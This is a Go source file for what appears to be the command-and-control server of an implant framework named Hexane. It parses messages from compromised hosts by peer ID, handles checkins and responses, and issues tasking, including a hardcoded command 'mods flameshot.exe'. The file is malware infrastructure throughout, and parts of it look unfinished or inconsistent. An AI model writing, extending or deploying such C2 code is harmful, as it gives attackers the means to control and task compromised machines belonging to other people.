package core

import (
	"fmt"
	"math/bits"
	"strings"
)

const HeaderLength = 12

func (m *Parser) DispatchCommand(s *Stream, UserInput string) {
	var (
		Buffer      []string
		Arguments   []string
		Command     string
		CommandType uint32
	)

	Buffer = strings.Split(UserInput, " ")
	Command = Buffer[0]

	Arguments = append(Arguments, Buffer[1:]...)
	Args := strings.Join(Arguments, " ")

	for k, v := range CommandMap {
		if Command == "" {
			CommandType = CommandNoJob
			break
		}
		if strings.EqualFold(k, Command) {
			CommandType = v
		}
	}

	s.PackDword(CommandType)
	s.PackString(Args)
}

func (s *Stream) CreateHeader(Parser *Parser, msgType uint32, taskId uint32) {

	s.PackDword(Parser.PeerId)
	s.PackDword(taskId)
	s.PackDword(msgType)
}

func (h *HexaneConfig) HandleCheckin(Parser *Parser, Stream *Stream) {

	h.Mu.Lock()
	defer h.Mu.Unlock()

	if Parser.ParserPrintData(TypeCheckin) {
		Stream.CreateHeader(Parser, TypeCheckin, uint32(h.CurrentTaskId))
	}
}

func (h *HexaneConfig) HandleResponse(Parser *Parser, Stream *Stream) {

	h.Mu.Lock()
	defer h.Mu.Unlock()

	if Parser.ParserPrintData(TypeTasking) {
		Stream.CreateHeader(Parser, TypeCheckin, uint32(h.CurrentTaskId))
	}
}

func (h *HexaneConfig) HandleCommand(Parser *Parser, Stream *Stream) {

	h.Mu.Lock()
	defer h.Mu.Unlock()

	Stream.CreateHeader(Parser, TypeTasking, uint32(h.CurrentTaskId))
	Parser.DispatchCommand(Stream, "mods flameshot.exe") // user command interface
}

func ParseMessage(body []byte) ([]byte, error) {
	var (
		err     error
		offset  uint32
		parser  *Parser
		implant *HexaneConfig
		stream  = new(Stream)
	)

	for len(body) > 0 {
		if len(body) < HeaderLength {
			break
		}

		parser = CreateParser(body)

		parser.PeerId = bits.ReverseBytes32(parser.ParseDword())
		parser.TaskId = bits.ReverseBytes32(parser.ParseDword())
		parser.MsgType = bits.ReverseBytes32(parser.ParseDword())

		if len(body) >= HeaderLength+4 {
			offset = parser.ParseDword()
			offset += HeaderLength + 4

		} else {
			offset = HeaderLength
		}

		if offset > uint32(len(body)) {
			break
		}

		if implant = GetConfigByPeerId(parser.PeerId); implant != nil {

			WrapMessage("DBG", fmt.Sprintf("found peer %d. Parsing message...", parser.PeerId))
			implant.CurrentTaskId++

			switch parser.MsgType {
			case TypeCheckin:
				{
					WrapMessage("DBG", "incoming message is a checkin")
					implant.HandleCheckin(parser, stream)
					break
				}
			case TypeTasking:
				{
					WrapMessage("DBG", "incoming message is a task request")
					implant.HandleCommand(parser, stream)
					break
				}
			case TypeResponse:
				{
					WrapMessage("DBG", "incoming message is a response with data")
					implant.HandleResponse(parser, stream)
					break
					// print response
				}
			case TypeSegment:
				{
					WrapMessage("DBG", "incoming message is a segment with data")
					// this will loop and do nothing.
				}
			default:
				{
					WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", parser.MsgType))
					stream.Buffer = []byte("200 ok")
					break
				}
			}
		} else {
			WrapMessage("ERR", "could not find peer in the database")
			stream.Buffer = []byte("ok")
		}

		body = body[offset:]
	}

	return stream.Buffer, err
}
